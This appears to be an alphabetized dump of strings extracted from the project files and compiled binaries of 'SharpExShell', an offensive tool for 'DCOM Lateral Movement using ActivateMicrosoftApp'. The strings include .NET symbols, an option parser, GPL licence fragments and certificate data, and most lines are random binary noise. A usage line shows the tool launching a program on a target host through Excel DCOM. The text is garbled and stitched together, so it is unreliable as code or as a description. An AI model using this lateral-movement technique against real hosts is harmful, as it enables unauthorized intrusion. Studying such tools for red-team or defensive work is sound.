+"{""WindowSettings"":{""project:SharpExcelDcom"":{""SourceRepositor2VSP"
+"{""WindowSettings"":{""project:SharpExcelDcom"":{""SourceRepository"":""nuget.org"",""ShowPreviewWindow"":true,""ShowDeprecatedFrameworkWindow"":true,""RemoveDependencies"":false,""ForceRemove"":false,""IncludePrerelease"":false,""SelectedFilter"":""All"",""DependencyBehavior"":""Lowest"",""FileConflictAction"":""PromptUser"",""OptionsExpanded"":false,""SortPropertyName"":""ProjectName"",""SortDirection"":""Ascending""}}} "
+"{DestinationFolder}"""
+"{xCQ(,(E"
+$(MSBuildToolsVersion)
+$(Platform)' == 'Debug
+$(Platform)' == 'Release
+$0wq6LSZL
+$13c84182-2f5f-4ee8-a37a-4483e7e57154
+$6e4bcd7a-44df-4ab4-b546-0af4f2bd0040
+$KEGpOB
+$RYJ
+$d7b0b5d9-0515-4f82-93fd-8e8b8304dd96
+$oFl
+%CpY
+%_l/l_k><5_50
+%lQ_G
+%mla
+' as shown below:
+''4o
+''Sa
+'Wmvy}
+'okw
+(DigiCert SHA2 Assured ID Code Signing CA
+(DigiCert SHA2 Assured ID Code Signing CA0
+(Symantec SHA256 TimeStamping Signer - G2
+(Symantec SHA256 TimeStamping Signer - G20
+(g55W
+(including a cross-claim or counterclaim in a lawsuit) alleging that
+(such as an express permission to practice a patent or covenant not to
+)'%http://s.symcb.com/universal-root.crl0
+)zLI_cFI
+-1hEbpyG
+-=5A
+-]75n-M
+-siq
+. R9Fk6
+.60M
+.</dc:description><dc:identifier>NDesk.Options</dc:identifier><version>0.2.1</version><dc:language>en-US</dc:language><keywords /></coreProperties>PK
+.NET Framework 4.5
+.NETFramework
+.cctor
+.ctor
+.dll
+.exe
+.hlD2f
+.rsrc
+.signature.p7s0$
+.signature.p7sPK
+.text
+.winmd
+/'!(
+//      Build Number
+//      Major Version
+//      Minor Version
+//      Revision
+// <autogenerated />
+// General Information about an assembly is controlled through the following
+// Setting ComVisible to false makes the types in this assembly not visible
+// The following GUID is for the ID of the typelib if this project is exposed to COM
+// Version information for an assembly consists of the following four values:
+// You can specify all the values or you can default the Build and Revision Numbers
+// associated with an assembly.
+// by using the '
+// set of attributes. Change these attribute values to modify the information
+// to COM components.  If you need to access a type in this assembly from
+/0-0
+/1(0
+/10000
+/5ROw[
+/Gok5
+/LinkInfo
+/TMCache
+/VeriSign Universal Root Certification Authority0
+/W7u
+/http://ts-aia.ws.symantec.com/sha256-tss-ca.cer0(
+/i]5y
+/names
+/src/files/c:
+/src/headerblock
+/x[1
+00w1
+06000001
+06000002
+06000003
+06000004
+06000005
+06000008
+06000009
+0600000a
+0600000b
+0600000c
+0600000d
+061110000000Z
+080402000000Z
+0b2e6b758e286d8ee6a213329ae032de3f4ce6b3
+0q2_
+0w@u
+1-Q!m
+1.0.0.0
+131022120000Z
+160112000000Z
+170102000000Z
+180410000000Z
+181024223851Z0
+181024223852Z0/
+18Xe
+1>lkH
+1V=hHk>
+1[[System.Collections.Generic.KeyValuePair
+1_u_w5
+1fn$
+1vMf
+2.16.840.1.101.3.4.2.1-Hash:98rX92uac4kwSWMQ6keIhSn7/Qo5iWvf08/Rf9OF9Ts=
+2008
+20181024223852Z0
+210414120000Z01
+223343bd-a859-41a3-90c0-9dfa101f1a95>
+26v<j!Ra
+27297916
+280401235959Z01
+281022120000Z0r1
+2VSP
+2a<(
+2jMd
+2l{u
+2oZn}9M
+2x7n
+310111235959Z0w1
+311110000000Z0e1
+371201235959Z01
+3j@X
+426058dfa88f2b50fe267a9662b0d38e72d2db76
+45 1
+4TC='
+4o}P]2PPKq
+4}l7
+5'hg7}
+5)SW
+5A={
+5Ix{3
+5Q5Qrp
+5_35
+5pOc$lG
+5w/<ozO
+5xU m
+6.Cv
+6C500948
+6c/6
+6j.v[
+6u-_WZ
+6u[F
+7 3o@
+71Fv@
+79)BO
+7=Yk
+7FBDA2D2
+7JvQsvq@=
+7M/5_kk
+7P_C
+7http://cacerts.digicert.com/DigiCertAssuredIDRootCA.crt0
+7i1b
+7zA3x3
+8!UF)gb5WK
+8Microsoft.VisualStudio.Build.ComInteropWrapper.RarInputs
+8dqM
+8js 
+9 1I
+9070531/http://ts-crl.ws.symantec.com/sha256-tss-ca.crl0
+955=c
+9hJC
+:51__u
+:7DVi{5s
+:8sp8)
+:ok6
+:p9E
+:sVo
+:{'5}_[%>
+</OutputPath>
+</Project>
+</assembly>
+</configuration>
+</packages>
+<1:<>THIS>
+<1:action>
+<2:<>THIS>
+<2:action>
+<>c__CompilerGenerated0
+<>c__CompilerGenerated1
+<>c__CompilerGenerated2
+<>c__DisplayClass0_0
+<>o__0
+<>p__0
+<>p__1
+<>p__2
+<>p__3
+<>p__4
+<>p__5
+<Add>c__4
+<Add>c__5
+<DanglingDocuments
+<Main>b__0
+<Main>b__1
+<Main>b__2
+<Main>b__3
+<Main>b__4
+<Main>b__5
+<Module>
+<OptionSet>c__3
+<configuration>
+<https://www.gnu.org/licenses/>.
+<https://www.gnu.org/licenses/why-not-lgpl.html>.
+<packages>
+<z5nO
+=9BP
+>QY0
+>[Z7
+>}{ 
+@)]Vdq0
+@)uwCg
+@.reloc
+@7=[
+@_i[A
+@kdWM
+A141
+APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT
+ATA__
+Action
+ActionOption
+Activator
+AddImpl
+AddSeparators
+AddValue
+Additional permissions that are applicable to the entire Program shall
+Also add information on how to contact you by electronic and paper mail.
+Any CPU
+Any CPU = Debug
+Any CPU = Release
+Any CPU.ActiveCfg = Debug
+Any CPU.ActiveCfg = Release
+Any CPU.Build.0 = Debug
+Any CPU.Build.0 = Release
+App.config
+Append
+ArgumentException
+ArgumentNullException
+ArgumentOutOfRangeException
+Array
+AssemblyCompanyAttribute
+AssemblyConfigurationAttribute
+AssemblyCopyrightAttribute
+AssemblyDelaySignAttribute
+AssemblyDescriptionAttribute
+AssemblyFileVersionAttribute
+AssemblyInfo.cs
+AssemblyKeyFileAttribute
+AssemblyProductAttribute
+AssemblyTitleAttribute
+AssemblyTrademarkAttribute
+AssertValid
+AsyncCallback
+B26$
+BCSPA
+BMFT
+BSJB
+BeginInvoke
+Bhttp://cacerts.digicert.com/DigiCertSHA2AssuredIDCodeSigningCA.crt0
+Blob
+BlogPost
+BvrZ
+B{Registry:Software
+C:_}
+CS$<>8__locals0
+CSharpArgumentInfo
+CSharpArgumentInfoFlags
+CSharpBinderFlags
+CallSite
+CallSiteBinder
+Capture
+Char
+CleanUp
+Clear
+Clone
+Collection
+ComType
+ComVisibleAttribute
+CompilationRelaxationsAttribute
+CompilerGeneratedAttribute
+ComputerName
+Concat
+Console
+Contains
+ConvertFromString
+Converter
+Copy
+CopyTo
+Copyright 
+Corresponding Source conveyed under this section must be accompanied
+Count
+Create
+CreateCOMInstance
+CreateInstance
+CreateOptionContext
+D:0:0:{13C84182
+D:0:0:{13C84182-2F5F-4EE8-A37A-4483E7E57154}
+DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD
+DCOM Lateral Movement using ActivateMicrosoftApp
+DELI
+DELIDELIDELIDELIDESCECSPDELIDELIDELIDELIDESCECSP
+DELIDELIDELIDELIGBLI
+DELIGBLIh
+DG-XD
+Dc@_
+Debug
+DebuggableAttribute
+DebuggingModes
+DefaultMemberAttribute
+Delete
+Description
+DesignTimeResolveAssemblyReferences.cache
+DestinationFolder
+DfO8
+DigiCert Assured ID Root CA0
+DigiCert Inc1
+Dispose
+Documents
+DzZX
+E0C07
+E8-A37A-4483E7E57154}
+EE8-A37A-4483E7E57154}
+EMFT
+EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF
+E_r<
+EhF$
+Empty
+EndGlobal
+EndGlobalSection
+EndInvoke
+EndProject
+Enum
+Enumerator
+Eo!j
+Exception
+Facades
+File
+Format
+Foundation.  If the Program does not specify a version number of the
+Framework
+FrameworkDisplayName
+Full
+Func
+GBLI
+GBLI(
+GBLI1
+GBLIA
+GBLIb
+GBLIc
+GBLIf
+GBLIg
+GBLIh
+GBLIs
+GBLIu
+GNU GENERAL PUBLIC LICENSE
+GNU General Public License for most of our software
+GUID
+Gd7_
+GetArgumentName
+GetConverter
+GetDescription
+GetEnumerator
+GetKeyForItem
+GetLineEnd
+GetLines
+GetMember
+GetNames
+GetNextOptionIndex
+GetObjectData
+GetOptionForName
+GetOptionParts
+GetString
+GetTypeFromCLSID
+GetTypeFromHandle
+GetValueSeparators
+Global
+GlobalSection(ExtensibilityGlobals) = postSolution
+GlobalSection(ProjectConfigurationPlatforms) = postSolution
+GlobalSection(SolutionConfigurationPlatforms) = preSolution
+GlobalSection(SolutionProperties) = preSolution
+GqO_hCOv9p
+Group
+GroupCollection
+Guid
+GuidAttribute
+Gzhh
+H0F08
+H8oO_V
+HideSolutionNode = FALSE
+I$4[
+IAsyncResult
+ICollection
+IDictionary
+IDisposable
+IEnumerable
+IEnumerator
+IList
+I_k4H_
+IbnS
+IhQD
+IndexOf
+IndexOfAny
+Insert
+InsertItem
+Int32
+InvalidOperationException
+Invoke
+InvokeMember
+IsNullOrEmpty
+IsReadOnly
+IsWhiteSpace
+Item
+JBSCBCSC
+Join
+K)).c
+K_Dy6
+KeyNotFoundException
+KeyedCollection
+Khu2n
+KuD2A:
+L!This program cannot be run in DOS mode.
+LHq__CO5X<_
+LX=IEX5i
+LcH9@!n<
+License by making exceptions from one or more of its conditions.
+License of the Program or a work on which the Program is based.  The
+License would be to refrain entirely from conveying the Program.
+List
+LzL-
+M:[ltz
+MBRSC
+MW[!)
+MYlRP
+Main
+Match
+Math
+MaxValueCount
+MemberInfo
+MessageLocalizer
+Microsoft
+Microsoft C/C
+Microsoft Office
+Microsoft.CSharp
+Microsoft.CSharp.RuntimeBinder
+Microsoft.CSharp.dll
+MinimumVisualStudioVersion = 10.0.40219.1
+Mlz3
+MoveNext
+Ms}F=_b
+MulticastDelegate
+NDesk.Options
+NDesk.Options.0.2.1
+NDesk.Options.dll
+NDesk.Options.dll</HintPath>
+NDesk.Options.nuspec 
+NDesk.Options.nuspecPK
+NKSmk5
+NNqp
+NameTerminator
+Names
+NewMethod
+NnkD
+None
+NuMk
+O$IORPt
+O75/5[
+OB=k
+OF.2 I
+OL(_
+OVCw
+OXCZSe(x
+Object
+ObsoleteAttribute
+OfUc
+Office16
+OnParseComplete
+OpSec
+Option
+OptionAction
+OptionContext
+OptionException
+OptionIndex
+OptionName
+OptionSet
+OptionValueCollection
+OptionValueType
+OptionValues
+OptionWidth
+Optional
+OxoO
+P.o49X
+PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM
+Parse
+ParseBool
+ParseBundledValue
+ParsePrototype
+ParseValue
+Payload
+Pj]Os
+Pp/Cr
+Program
+Program Files
+Program Files (x86)
+Program specifies that a certain numbered version of the GNU General
+Program.cs
+Properties
+Prototype
+P{C4
+R1uB
+RNkJz
+RSDS$KEGpOB
+Redmond1
+Reference Assemblies
+Regex
+Release
+Remove
+RemoveAt
+RemoveItem
+Replace
+Required
+Rq5F
+RuntimeCompatibilityAttribute
+RuntimeTypeHandle
+Rv'i(
+S/uV
+SCCL
+SRb/<
+SUCH DAMAGES.
+SWA/
+SerializationInfo
+SetItem
+Shar
+SharpExShell
+SharpExShell.Program
+SharpExShell.Program.<>c__DisplayClass0_0
+SharpExShell.csproj
+SharpExShell.csproj.AssemblyReference.cache
+SharpExShell.csproj.CopyComplete
+SharpExShell.csproj.CoreCompileInputs.cache
+SharpExShell.exe
+SharpExShell.exe.config
+SharpExShell.pdb
+ShowHelp
+Sk7yM6kSG
+Sleep
+SolutionGuid = {4604B793-28C5-4C8C-9208-7B4BC5E959C6}
+Source.
+Split
+States should not allow patents to restrict development and use of
+StreamingContext
+String
+StringBuilder
+StringSplitOptions
+Strings
+Substring
+Symantec Corporation1
+Symantec SHA256 TimeStamping CA
+Symantec SHA256 TimeStamping CA0
+Symantec Trust Network1(0
+Symantec Trust Network110/
+System
+System.Collections
+System.Collections.Generic
+System.Collections.Generic.KeyValuePair
+System.Collections.Generic.List
+System.Collections.ICollection.CopyTo
+System.Collections.ICollection.IsSynchronized
+System.Collections.ICollection.SyncRoot
+System.Collections.IEnumerable.GetEnumerator
+System.Collections.IList.Add
+System.Collections.IList.Contains
+System.Collections.IList.IndexOf
+System.Collections.IList.Insert
+System.Collections.IList.IsFixedSize
+System.Collections.IList.Item
+System.Collections.IList.Remove
+System.Collections.IList.RemoveAt
+System.Collections.ObjectModel
+System.ComponentModel
+System.Core
+System.Core.dll
+System.Data.DataSetExtensions.dll
+System.Data.dll
+System.Diagnostics
+System.IO
+System.Net.Http.dll
+System.Reflection
+System.Runtime.CompilerServices
+System.Runtime.InteropServices
+System.Runtime.Serialization
+System.Runtime.Versioning
+System.Text
+System.Text.RegularExpressions
+System.Threading
+System.Xml.Linq.dll
+System.Xml.dll
+System.dll
+System32
+T3Bs
+T3Pt(
+THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
+TInput
+TKey
+TN9T
+TOutput
+TRACE</DefineConstants>
+TValue
+TXAD{R0
+TXHxB
+Target
+TargetFrameworkAttribute
+TextWriter
+The hypothetical commands 
+Thread
+TimeStamp-2048-30
+TimeStamp-2048-50
+ToArray
+ToList
+ToLower
+ToString
+Type
+TypeConverter
+TypeDescriptor
+U!)_C
+U'pL
+UNDesk.Options
+USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF
+USystem
+USystem.Threading
+UVersion:1
+Ue_i
+Unprocessed
+User Product is transferred to the recipient in perpetuity or for a
+Users
+V-p)F
+VS/5
+ValueOption
+ValueSeparators
+VeriSign Trust Network1:08
+VisualStudioVersion = 16.0.34114.132
+VuV-r
+Vw_5
+Washington1
+Windows
+Wkbh_.D
+WrapNonExceptionThrows
+Write
+WriteLine
+WriteOptionDescriptions
+WriteOptionPrototype
+XSkkV
+YYUOr]
+Yeu_
+YvmK
+Z13_
+Zwl[cxCDkN
+[/5_mo$
+[1cKx
+[1}ykT6
+[Content_Types].xml 
+[Content_Types].xmlPK
+[assembly: ComVisible(false)]
+[mw_
+] Example: SharpExcelDCom.exe -m FoxPro -t localhost -p calc.exe -d C:
+]BvOOc
+]FXZ1
+]P>E
+]_5$
+_/NzDqT
+_0]0[
+_5Rk
+_5fC
+_7)>H
+_7uH
+_7{k/5
+_@s{
+_CorDllMain
+_Entry_Point
+_Jx_
+_K8p
+_Ly_B
+_T6OfZ
+_]yu
+__@_L%
+__OW
+_c7wO
+_gog
+_items
+_ko}{
+_ogW
+_rels/.rels 
+_rels/.relsPK
+_size
+_version
+_y5x
+a further restriction but permits relicensing or conveying under this
+a modified version of its Corresponding Source.  The information must
+a0_][0Y0W0U
+aE05UK
+action
+address new problems or concerns.
+adversely affects the operation of the network or violates the rules and
+allowedAssemblyExtensions
+amd64
+an absolute waiver of all civil liability in connection with the
+and execute modified versions of a covered work in that User Product from
+and the Corresponding Source of the work is not available for anyone
+and you may offer support or warranty protection for a fee.
+any implied license or other defenses to infringement that may
+any other work released this way by its authors.  You can apply it to
+appConfigFile
+appropriately publish on each copy an appropriate copyright notice
+args
+argument
+arguments
+array
+arrayIndex
+assemblyinfo.cs
+author or copyright holder as a result of your choosing to follow a
+authors of previous versions.
+avoid the special danger that patents applied to a free program could
+bPgl
+been installed in ROM).
+beyond what the individual works permit.  Inclusion of a covered work
+blogpost
+but do not include claims that would be infringed only as a
+by the Free Software Foundation.
+by the Installation Information.  But this requirement does not apply
+c0a0
+cG!s'5
+callback
+can do so.  This is fundamentally incompatible with the aim of
+can regenerate automatically from other parts of the Corresponding
+candidateAssemblyFiles
+circumvention of technological measures to the extent such circumvention
+co!lW_
+code is in no case prevented or interfered with solely because
+combination as such.
+conditioned on the non-exercise of one or more of the rights that are
+conditions are met.  This License explicitly affirms your unlimited
+consequence of further modification of the contributor version.  For
+context
+copy of the Program in return for a fee.
+count
+country that you have reason to believe are valid.
+covered work so as to satisfy simultaneously your obligations under this
+cv2w1!
+dKk)
+dQU[Ab
+dcom lateral movement using activatemicrosoftapp
+description
+documented (and with an implementation available to the public in
+documents
+doubtful cases shall be resolved in favor of coverage.  For a particular
+ds<3
+dsQZqk>wZ
+d}(=]1
+eNyS
+eVe]f
+egI]
+elative:sharpexshell
+enb>
+excelApp
+excuse you from the conditions of this License.  If you cannot convey a
+extra
+ezMQ-
+f:B_W
+fAX$
+fWpuqP7b
+fZe15
+fe-4687-9b6c-b126a312a9a0
+file:///C:/Users/rpatel/Documents/BlogPost/DCOM Lateral Movement using ActivateMicrosoftApp/4.5/SharpExShell/packages/NDesk.Options.0.2.1/lib/NDesk.Options.dll
+flag
+for and in connection with specific products or compilations that
+for enforcing compliance by third parties with this License.
+for which you have or can give appropriate copyright permission.
+form of a work.
+free software which everyone can redistribute and change under these terms.
+fuSCoP
+fullFrameworkAssemblyTables
+fullFrameworkFolders
+fullTargetFrameworkSubsetNames$ignoreDefaultInstalledAssemblyTables
+g)'{
+g/N<O
+g4@vH
+gN %
+gdtarSearchPaths
+get_Chars
+get_Count
+get_Current
+get_Description
+get_Dictionary
+get_Error
+get_Groups
+get_IsFixedSize
+get_IsReadOnly
+get_IsSynchronized
+get_Item
+get_Items
+get_Length
+get_MaxValueCount
+get_Message
+get_MessageLocalizer
+get_Name
+get_Names
+get_Option
+get_OptionIndex
+get_OptionName
+get_OptionSet
+get_OptionValueType
+get_OptionValues
+get_Out
+get_Prototype
+get_Success
+get_SyncRoot
+get_Value
+get_ValueSeparators
+governed by this License along with a term that is a further
+h@@D
+have designed this version of the GPL to prohibit the practice for those
+have the freedom to distribute copies of free software (and charge for
+holder fails to notify you of the violation by some reasonable means
+http://logo.verisign.com/vslogo.gif0
+http://ocsp.digicert.com0C
+http://ocsp.digicert.com0N
+http://s.symcd.com06
+http://ts-ocsp.ws.symantec.com0
+https://api.nuget.org/v3/index.json0
+https://d.symcb.com/cps0%
+https://d.symcb.com/rpa0.
+https://d.symcb.com/rpa0@
+https://www.digicert.com/CPS0
+hzg/q
+i4D%
+iO:%
+if neither you nor any third party retains the ability to install
+ignoreDefaultInstalledAssemblySubsetTables
+ij5Q
+image/gif0!0
+implementation is available to the public in source code form.  A
+in accord with this section must be in a format that is publicly
+in an aggregate does not cause this License to apply to the other
+in force.  You may convey covered works to others for the sole purpose
+in one of these ways:
+included in conveying the object code work.
+includes interface definition files associated with source files for
+index
+info
+innerException
+installedAssemblySubsetTables latestTargetFrameworkDirectories
+installedAssemblyTables
+is a consumer product regardless of whether the product has substantial
+is effected by exercising rights under this License with respect to
+is widely used among developers working in that language.
+it.  (Additional permissions may be written to require their own
+item
+jD_%
+j_S5
+jvt14'
+jzTF
+k0i0
+k2GNX':8L
+k6wKN
+kF5}
+kIs[
+kX6HGEFA
+k_5yY
+ka}G
+kbvhO
+kco_7H/[
+keep intact all notices of the absence of any warranty
+keep intact all notices stating that this License and any
+know their rights.
+kqKWZ[
+k}kY
+l=c!$9
+lA/w-
+l_7-
+later version.
+length
+lib/NDesk.Options.dll 
+lib/NDesk.Options.dllPK
+license from a particular copyright holder is reinstated (a)
+licenses of parties who have received copies or rights from you under
+licenses to the work the party's predecessor in interest had or could
+localhost
+localizer
+m0k0$
+mB<K
+mQ-21Uk
+makes it unnecessary.
+material under section 10.
+maxIndex
+maxValueCount
+may consider it more useful to permit linking proprietary applications with
+measure under any applicable law fulfilling obligations under article
+measures.
+message
+method
+might be different
+mj=gh[]=S_8t]
+mkHZxV
+modification follow.
+modification has been made.
+modify any covered work.  These actions infringe copyright if you do
+mscoree.dll
+mscorlib
+mscorlib.dll
+msil
+mvkW@
+nDa5
+name
+names
+namespace SharpExShell
+network may be denied when the modification itself materially and
+non-permissive terms added in accord with section 7 apply to the code
+not control copyright.  Those thus making or running the covered works
+not survive such relicensing or conveying.
+nothing other than this License grants you permission to propagate or
+notice like this when it starts in an interactive mode:
+o%C5Ab!cE
+o=y'x{
+oAk.o_ojN
+o[-od
+object
+occurring solely as a consequence of using peer-to-peer transmission
+odh-B
+oeSz
+of the particular user or of the way in which the particular user
+ok_5>zHd5
+on the Program.
+ookzo[
+op_Equality
+op_Inequality
+option
+option of following the terms and conditions either of that numbered
+optionName
+opts
+or can get the source code.  And you must show them these terms so they
+oscV}4-
+otherwise be available to you under applicable patent law.
+p/O25
+p0n0531/http://crl3.digicert.com/sha2-assured-cs-g1.crl0531/http://crl4.digicert.com/sha2-assured-cs-g1.crl0L
+p1f3q>p
+p7HE
+pU{OX-
+package/services/metadata/core-properties/b509421ca6a848d282a3d6adaf5f424b.psmdcp 
+package/services/metadata/core-properties/b509421ca6a848d282a3d6adaf5f424b.psmdcpPK
+packages
+packages.config
+paragraph of section 11).
+parent
+part of a transaction in which the right of possession and use of the
+parties to make or receive copies.  Mere interaction with a user through
+parts of the aggregate.
+party means to make such an agreement or commitment not to enforce a
+patent against the party.
+patent license (a) in connection with copies of the covered work
+patent sublicenses in a manner consistent with the requirements of
+patents cannot be used to render the program non-free.
+pattern of such abuse occurs in the area of products for individuals to
+pdtarSearchPaths
+permission to link or combine any covered work with a work licensed
+permission to run the unmodified Program.  The output from running a
+price.  Our General Public Licenses are designed to make sure that you
+prior to 60 days after the cessation.
+profileName
+program.cs
+programs which are used unmodified in performing those activities but
+propagate the contents of its contributor version.
+properties
+protecting users' freedom to change the software.  The systematic
+protocols for communication across the network.
+prototype
+provided under this License.  Any attempt otherwise to propagate or
+public statement of acceptance of a version permanently authorizes you
+q0 i_u
+q72_t4]
+q]GYY
+q_'_
+q_V)oG}:
+qf]y
+received notice of violation of this License (for any work) from that
+recipients a copy of this License along with the Program.
+referencePaths
+registrySearchPath
+reinstated permanently if the copyright holder notifies you of the
+release
+removal in certain cases when you modify the work.)  You may place
+result
+reviewing courts shall apply local law that most closely approximates
+root
+rpatel
+rszdrf2BubV
+run a copy of the Program.  Ancillary propagation of a covered work
+s3_x
+sLSR
+s_kA
+same work.
+separators
+seps
+set_Item
+set_Option
+set_OptionIndex
+set_OptionName
+share and change all versions of a program--to make sure it remains free
+sharpexshell
+show c' for details.
+show c' should show the appropriate
+show w' and 
+show w'.
+showhelp
+similar laws prohibiting or restricting circumvention of such
+software and other kinds of works.
+solutionrelative:sharpexshell
+specifically granted under this License.  You may not convey a covered
+stand ready to extend this provision to those domains in future versions
+start
+state the exclusion of warranty
+stateFile
+subprograms and other parts of the work.
+such as by intimate data communication or control flow between those
+suffice to ensure that the continued functioning of the modified object
+svxi9
+swxH3
+system32
+t05b
+tJ$O<wYkdv]
+targetFrameworkDirectories
+targetFrameworkMoniker!targetFrameworkMonikerDisplayName
+targetFrameworkSubsets
+targetFrameworkVersion
+targetProcessorArchitecture
+targetedRuntimeVersion
+tdkfC
+technological measures.
+tells the user that there is no warranty for the work (except to the
+that material) supplement the terms of this License with terms:
+that there is no warranty for this free software.  For both users' and
+that they are valid under applicable law.  If additional permissions
+the GNU General Public License from time to time.  Such new versions will
+the GNU General Public License is intended to guarantee your freedom to
+the User Product in which it has been modified or installed.  Access to a
+the above requirements apply either way.
+the conditions stated below.  Sublicensing is not allowed
+the only significant mode of use of the product.
+the predecessor has it or can get it with reasonable efforts.
+the terms of this License in conveying all material for which you do
+then you must either (1) cause the Corresponding Source to be so
+this License (including any patent licenses granted under the third
+this License without regard to the additional permissions.
+this License.
+this License.  If your rights have been terminated and not permanently
+tionrelative:sharpexshell
+to attach them to the start of each source file to most effectively
+to choose that version for the Program.
+to collect a royalty for further conveying from those to whom you convey
+to the extent that it includes a convenient and prominently visible
+to the third party based on the extent of your activity of conveying
+toUn
+transaction who receives a copy of the work also receives whatever
+type
+uOu_5_
+un1h
+under version 3 of the GNU Affero General Public License into a single
+useReferencesFromProject
+used to limit the access or legal rights of the compilation's users
+users
+using NDesk.Options
+using System
+using System.Reflection
+using System.Runtime.CompilerServices
+using System.Runtime.InteropServices
+using System.Threading
+uu.f
+v2.0.50727
+v4.0.30319
+v4.5
+v_Zia/
+value
+value__
+values
+version or of any later version published by the Free Software
+w(cs
+w/x/V
+where to find the applicable terms.
+wiHGS
+windows
+work and works based on it.
+work if you are a party to an arrangement with a third party that is
+written
+www.digicert.com110/
+x0v0$
+x64 = Debug
+x64 = Release
+x64.ActiveCfg = Debug
+x64.ActiveCfg = Release
+x64.Build.0 = Debug
+x64.Build.0 = Release
+xGGLz3!
+xJww
+xlBna
+xmfA
+y3LNA
+y>3o:
+yQXf
+you grant is automatically extended to all recipients of the covered
+you modify it: responsibilities to respect the freedom of others.
+your copyrighted material outside their relationship with you.
+your receipt of the notice.
+z0x0:864http://crl4.digicert.com/DigiCertAssuredIDRootCA.crl0:864http://crl3.digicert.com/DigiCertAssuredIDRootCA.crl0O
+z9}UQv
+zUNt
+zX]<
+zkNN:
+zvld
+zw>w$
+{13C84182-2F5F-4EE8-A37A-4483E7E57154}.Debug
+{13C84182-2F5F-4EE8-A37A-4483E7E57154}.Release
+{A6C74
+{A6C744A8-0E4A-4FC6-886
+{A6C744A8-0E4A-4FC6-886A-064283054674}
+{CandidateAssemblyFiles}
+{ComputerName}
+{HintPathFromItem}
+{ISA'=O}%
+{RawFileName}
+{TargetFrameworkDirectory}
+{o]-_
+{oo_
+}!ZhOR
+}.M5
+}00vt0r1
+}0u@UkW
+}D66
+}Q75
